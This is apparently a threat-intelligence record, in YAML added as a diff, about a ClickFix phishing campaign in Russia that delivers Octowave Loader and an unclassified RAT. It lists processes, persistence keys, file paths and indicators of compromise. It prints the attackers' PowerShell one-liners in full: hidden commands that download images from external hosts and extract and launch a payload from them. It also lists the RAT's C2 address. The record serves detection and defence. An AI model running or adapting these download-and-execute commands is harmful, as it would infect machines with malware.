@@ -1,0 +1,169 @@
+title: ClickFix Campaign Targeting Russia Delivers Octowave Loader and Unclassified
+  RAT
+description: Threat actors used ClickFix social engineering via phishing emails with
+  PDF lures to trick users into running PowerShell commands that download and execute
+  Octowave Loader, which uses DLL side-loading and steganography to deploy an unclassified
+  RAT with C2 communication over HTTP.
+attribution: ''
+malware_families:
+- Octowave Loader
+cves: []
+ttps:
+  processes:
+  - powershell.exe
+  - rundll32.exe
+  - regsvr32.exe
+  - AGF3DPrinterDriver.exe
+  - CoreSync.exe
+  - EAGf3DPrinterDriver.exe
+  command_lines:
+  - powershell -nop -w Hidden -c "$b=(iwr 'i.imghippo[.]com/files/wN1688B.png').Content;function
+    q($o,$s){-join[char[]]$b[$o..($o+$s-1)]};[io.file]::WriteAllBytes((q 56 40),$b[241..(241+31261183)]);saps
+    (q 124 12) -a (q 169 51)"
+  - powershell -nop -w Hidden -c "$b=(New-Object System.Net.WebClient).DownloadData('hxxp://docrf[.]org:7891/yandex.png');function
+    q($o,$s){-join[char[]]$b[$o..($o+$s-1)]};[io.file]::WriteAllBytes((q 56 40),$b[241..11150064]);saps
+    (q 124 12) -a (q 169 51)"
+  - powershell -nop -w Hidden -c "$b=(iwr 'i.imghippo[.]com/files/SS4638dPY.png').Content;function
+    q($o,$s){-join[char[]]$b[$o..($o+$s-1)]};[io.file]::WriteAllBytes((q 56 40),$b[241..(241+11149823)]);saps
+    (q 124 12) -a (q 169 51)"
+  - '%WINDIR%\System32\WindowsPowershell\v0\powershell.exe -NoLogo -NoProfile -Command
+    <command>'
+  - '%WINDIR%\System32\rundll32.exe <dllPath>,<Params>'
+  - '%WINDIR%\System32\regsvr32.exe /s'
+  powershell:
+  - $b=(iwr 'i.imghippo[.]com/files/wN1688B.png').Content;function q($o,$s){-join[char[]]$b[$o..($o+$s-1)]};[io.file]::WriteAllBytes((q
+    56 40),$b[241..(241+31261183)]);saps (q 124 12) -a (q 169 51)
+  - $b=(New-Object System.Net.WebClient).DownloadData('hxxp://docrf[.]org:7891/yandex.png');function
+    q($o,$s){-join[char[]]$b[$o..($o+$s-1)]};[io.file]::WriteAllBytes((q 56 40),$b[241..11150064]);saps
+    (q 124 12) -a (q 169 51)
+  - $b=(iwr 'i.imghippo[.]com/files/SS4638dPY.png').Content;function q($o,$s){-join[char[]]$b[$o..($o+$s-1)]};[io.file]::WriteAllBytes((q
+    56 40),$b[241..(241+11149823)]);saps (q 124 12) -a (q 169 51)
+  scripts: []
+  registry_keys:
+  - HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
+  - HKCU\SOFTWARE\<GetVolumeInformation()>
+  image_loads:
+  - tbb.dll
+  - apiecho.dll
+  - gude.dll
+  - D3Help3.dll
+  - LicChecker.dll
+  - api-ms-win-core-console-l1-1-0.dll
+  - api-ms-win-core-console-l1-2-0.dll
+  - api-ms-win-core-datetime-l1-1-0.dll
+  - api-ms-win-core-debug-l1-1-0.dll
+  - api-ms-win-core-errorhandling-l1-1-0.dll
+  - api-ms-win-core-file-l1-1-0.dll
+  - api-ms-win-core-file-l1-2-0.dll
+  - api-ms-win-core-file-l2-1-0.dll
+  - api-ms-win-core-handle-l1-1-0.dll
+  - api-ms-win-core-heap-l1-1-0.dll
+  - api-ms-win-core-interlocked-l1-1-0.dll
+  - api-ms-win-core-libraryloader-l1-1-0.dll
+  - api-ms-win-core-localization-l1-2-0.dll
+  - api-ms-win-core-memory-l1-1-0.dll
+  - api-ms-win-core-namedpipe-l1-1-0.dll
+  - api-ms-win-core-processenvironment-l1-1-0.dll
+  - api-ms-win-core-processthreads-l1-1-0.dll
+  - api-ms-win-core-processthreads-l1-1-1.dll
+  - api-ms-win-core-profile-l1-1-0.dll
+  - api-ms-win-core-rtlsupport-l1-1-0.dll
+  - api-ms-win-core-string-l1-1-0.dll
+  - api-ms-win-core-synch-l1-1-0.dll
+  - api-ms-win-core-synch-l1-2-0.dll
+  - api-ms-win-core-sysinfo-l1-1-0.dll
+  - api-ms-win-core-timezone-l1-1-0.dll
+  - api-ms-win-core-util-l1-1-0.dll
+  - API-MS-Win-core-xstate-l2-1-0.dll
+  - api-ms-win-crt-conio-l1-1-0.dll
+  - api-ms-win-crt-convert-l1-1-0.dll
+  - api-ms-win-crt-environment-l1-1-0.dll
+  - api-ms-win-crt-filesystem-l1-1-0.dll
+  - api-ms-win-crt-heap-l1-1-0.dll
+  - api-ms-win-crt-locale-l1-1-0.dll
+  - api-ms-win-crt-math-l1-1-0.dll
+  - api-ms-win-crt-multibyte-l1-1-0.dll
+  - api-ms-win-crt-private-l1-1-0.dll
+  - api-ms-win-crt-process-l1-1-0.dll
+  - api-ms-win-crt-runtime-l1-1-0.dll
+  - api-ms-win-crt-stdio-l1-1-0.dll
+  - api-ms-win-crt-string-l1-1-0.dll
+  - api-ms-win-crt-time-l1-1-0.dll
+  - api-ms-win-crt-utility-l1-1-0.dll
+  - DearmobParsing.dll
+  - mfc140u.dll
+  - msvcp120.dll
+  - msvcp140.dll
+  - msvcp140_1.dll
+  - msvcp140_2.dll
+  - msvcp140_atomic_wait.dll
+  - msvcp140_codecvt_ids.dll
+  - NativeDocumentParsers.dll
+  - ucrtbase.dll
+  - vcorlib140.dll
+  - vcomp140.dll
+  - vcruntime140.dll
+  network_connections:
+  - RAT -> hxxp://82.117.87[.]103/q?=furries
+  file_activity:
+  - C:\Users\Public\Downloads\LicChecker.dll
+  - '%LOCALAPPDATA%\Programs\Adobe Printer Driver\AGF3DPrinterDriver.exe'
+  - '%LOCALAPPDATA%\Programs\Adobe CoreSync\CoreSync\CoreSync.exe'
+  - '%LOCALAPPDATA%\Programs\Adobe Printer Driver\Galleries\Achievement.db'
+  - '%LOCALAPPDATA%\Programs\Adobe CoreSync\CoreSync\Analysis.db'
+  - '%ProgramData%\lockfile'
+  - EAGf3DPrinterDriver.exe
+  - apiecho.dll
+  - NativeDocumentParsers.dll
+  persistence:
+  - Registry Run key HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
+    value "Adobe Printer Driver" pointing to %LOCALAPPDATA%\Programs\Adobe Printer
+    Driver\AGF3DPrinterDriver.exe
+  - Registry Run key HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
+    value "Adobe Sync Pro" pointing to %LOCALAPPDATA%\Programs\Adobe CoreSync\CoreSync\CoreSync.exe
+  - Scheduled Task "Adobe Printer Driver" runs %LOCALAPPDATA%\Programs\Adobe Printer
+    Driver\AGF3DPrinterDriver.exe at user logon
+  - Scheduled Task "Adobe Sync Pro" runs %LOCALAPPDATA%\Programs\Adobe CoreSync\CoreSync\CoreSync.exe
+    at user logon
+  process_relations:
+  - AGF3DPrinterDriver.exe -> tbb.dll -> apiecho.dll
+  - CoreSync.exe -> gude.dll -> D3Help3.dll
+iocs:
+  hashes:
+  - 673e826846b40f16508677efe1c7a272
+  - 865157fb48c1f81ff7975af3b2a3149e
+  - b984fc4ba98c3e787eaa7c8bb0def3f7
+  - 04849753bb1a51af816bdc91be24d3e4
+  - 2c86d226fb4584ca7bd1284600b8c6ea
+  - 5a1f312de78595b5c22ff6bc1c6522f3
+  - 3ee3d3d0a515b24f1b104cb8ec1b8d01
+  - b5af63c55c9c8424230826b736d70549
+  - 2ab9b583b5c85b3c2e927d02f7ee316f
+  - 9e5eaf2db394a8c1d970b428dabe08a0
+  - cce5b6dcdfa69e1b1e3d78ec1d3ec09c
+  - 12861bf95e033d79aabe9bd2d28577ce
+  - 97b507a8d197ad901b6de1e9042b7ab9
+  - 4b0d263dd6c0852600ac7b80754fd686
+  - ef16edc3b8de0f6456b4ecde12a90dc1
+  - b1678816390d01d187c73edfbaff2249
+  - acbfd3f0768fe1f730c6f93fec4b2a97
+  - 61c469226d5ac00ca7a15358e656a226
+  - 0f8635172da61dc6161b428a6b120461
+  - b5a9b04165483374b15beca5f0a12bc8
+  - e633535706b7654f458ada840be494f7
+  - 460a8fbfbf0078c95dc5785213ba14de
+  ip_addresses:
+  - 82.117.87[.]103
+  domains:
+  - yasec[.]ru
+  - docrf[.]org
+  - i.imghippo[.]com
+  urls:
+  - hxxp://docrf[.]org:7891/yandex.png
+  - hxxp://82.117.87[.]103/q?=furries
+  - i.imghippo[.]com/files/wN1688B.png
+  - i.imghippo[.]com/files/SS4638dPY.png
+authors: []
+reference: https://bi.zone/eng/expertise/blog/proydite-proverku-i-poluchite-vpo-clickfix-dobralas-do-rossii
+date_of_publication: May 18, 2026
+file_creation_date: May 22, 2026
